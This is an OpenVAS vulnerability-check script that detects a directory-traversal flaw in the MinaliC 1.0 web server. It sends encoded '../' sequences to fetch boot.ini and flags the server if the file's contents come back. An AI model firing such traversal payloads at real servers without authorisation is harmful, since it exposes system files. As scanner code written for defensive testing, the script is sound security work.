###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_minalic_44393.nasl 14 2013-10-27 12:33:37Z jan $
#
# MinaliC Directory Traversal and Denial of Service Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "MinaliC is prone to a directory-traversal vulnerability and a denial-of-
service vulnerability.

Exploiting these issues will allow attackers to obtain sensitive
information or cause denial-of-service conditions.

MinaliC 1.0 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100872);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-10-26 13:33:58 +0200 (Tue, 26 Oct 2010)");
 script_bugtraq_id(44393);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

 script_name("MinaliC Directory Traversal and Denial of Service Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/44393");
 script_xref(name : "URL" , value : "http://sourceforge.net/projects/minalic/");
 script_xref(name : "URL" , value : "http://www.johnleitch.net/Vulnerabilities/MinaliC.Webserver.1.0.Directory.Traversal/53");
 script_xref(name : "URL" , value : "http://www.johnleitch.net/Vulnerabilities/MinaliC.Webserver.1.0.Denial.Of.Service/52");

 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if MinaliC is prone to a directory-traversal vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 8000);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:8000);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if(!banner || "Server: minaliC" >!< banner)exit(0);

traversal = make_list(crap(data:"..%2f",length:7*5),crap(data:"..%5c",length:7*5));

foreach trav (traversal) {

  url = string(trav,"boot.ini"); 

  if(http_vuln_check(port:port, url:url,pattern:"\[boot loader\]")) {
     
    security_warning(port:port);
    exit(0);

  }
}

exit(0);
